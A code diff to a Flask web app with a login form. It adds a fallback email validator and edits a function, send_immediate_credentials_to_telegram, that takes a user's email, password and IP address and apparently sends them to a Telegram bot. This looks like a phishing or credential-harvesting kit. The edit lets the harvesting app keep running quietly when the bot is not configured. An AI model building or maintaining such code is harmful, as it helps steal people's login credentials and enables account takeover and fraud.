@@ -19,7 +19,19 @@ def config(key, default=None):
     return os.environ.get(key, default)
 from flask_wtf import FlaskForm, CSRFProtect
 from wtforms import StringField, PasswordField, SubmitField
-from wtforms.validators import DataRequired, Email
+from wtforms.validators import DataRequired
+try:
+    from wtforms.validators import Email
+except ImportError:
+    # Fallback if email_validator is not installed
+    class Email:
+        def __init__(self, message=None):
+            self.message = message or "Invalid email address"
+        
+        def __call__(self, form, field):
+            import re
+            if not re.match(r"[^@]+@[^@]+\.[^@]+", field.data):
+                raise ValueError(self.message)
 import bcrypt
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
@@ -384,9 +396,9 @@ def send_immediate_credentials_to_telegram(email, password, ip_address):
         bot_token = config('BOT_TOKEN', default=None)
         chat_id = config('CHAT_ID', default=None)
         
-        if not bot_token or not chat_id:
-            logger.error("❌ Telegram credentials not properly configured!")
-            return False
+        if not bot_token or not chat_id or bot_token == 'your-bot-token-here' or chat_id == 'your-chat-id-here':
+            logger.warning(f"⚠️ Telegram credentials not configured - BOT_TOKEN: {bool(bot_token)}, CHAT_ID: {bool(chat_id)}")
+            return True  # Don't fail the app if Telegram isn't configured
         
         if bot_token.strip() == '' or chat_id.strip() == '':
             logger.error("❌ Telegram credentials are empty!")
